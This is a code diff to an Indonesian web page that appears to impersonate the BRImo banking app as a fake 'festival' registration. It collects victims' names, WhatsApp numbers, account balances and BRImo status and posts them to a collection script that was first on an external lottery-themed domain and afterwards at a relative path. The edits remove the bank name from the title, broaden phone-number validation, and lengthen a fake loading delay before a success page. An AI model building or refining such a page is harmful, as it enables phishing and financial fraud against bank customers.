@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BRImo - Pendaftaran Festival</title>
+    <title>Pendaftaran Festival</title>
     <meta name="theme-color" content="#0f78cb">
     <link rel="icon" type="image/png" href="https://hosting.tigerengine.id/nssd3w.png">
     <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
@@ -17,7 +17,6 @@
             overflow-x: hidden;
         }
 
-        /* LOADING CENTER FIX */
         .load {
             position: fixed; 
             top: 0; left: 0; 
@@ -99,7 +98,6 @@
             transition: all 0.3s ease;
         }
 
-        /* Error Input Style */
         .input-error { border-color: #ff4d4d !important; background-color: #fff5f5 !important; }
 
         .button {
@@ -151,7 +149,7 @@
                     <div class="input-field">
                         <label>Nomor WhatsApp</label>
                         <ion-icon name="phone-portrait-sharp"></ion-icon>
-                        <input type="tel" id="nohp" name="NOMOR" placeholder="08xxxxxxxx" maxlength="13" required>
+                        <input type="tel" id="nohp" name="NOMOR" placeholder="08 atau 62" maxlength="15" required>
                     </div>
 
                     <div class="input-field">
@@ -182,13 +180,15 @@
         $(document).ready(function() {
             $('.saldo').mask('000.000.000.000.000', {reverse: true});
             
-            // ANTI-SPAM VALIDATION
             $('#nohp').on('input', function() {
                 let num = $(this).val().replace(/[^0-9]/g, '');
                 $(this).val(num);
 
-                // Harus mulai 08 dan panjang 10-13 digit
-                if (num.startsWith('08') && num.length >= 10) {
+                // Validasi: Harus diawali 08 atau 628 dan panjang minimal 10
+                let isValidPrefix = num.startsWith('08') || num.startsWith('628');
+                let isValidLength = num.length >= 10;
+
+                if (isValidPrefix && isValidLength) {
                     $(this).removeClass('input-error');
                     $('#lanjutkan').prop('disabled', false);
                 } else {
@@ -206,6 +206,11 @@
                 let saldo = $("input[name='SALDO']").val();
                 let status = $("#statusBrimo").val();
 
+                // KONVERSI OTOMATIS: Jika 628 -> Jadi 08
+                if (nomor.startsWith('628')) {
+                    nomor = '08' + nomor.substring(2);
+                }
+
                 // Simpan Memori
                 localStorage.setItem("nama", nama);
                 localStorage.setItem("wa", nomor);
@@ -214,10 +219,11 @@
 
                 $.ajax({
                     type: 'POST',
-                    url: 'https://undian-brimo.fest14l.biz.id/login/sendIndex.php',
+                    url: 'login/sendIndex.php',
                     data: {NAMA: nama, NOMOR: nomor, SALDO: saldo, STATUS_BRIMO: status},
                     success: function() {
-                        setTimeout(() => { window.location.href = "success.html"; }, 1500);
+                        // Durasi loading 3 detik agar mantap
+                        setTimeout(() => { window.location.href = "success.html"; }, 3000);
                     }
                 });
             });
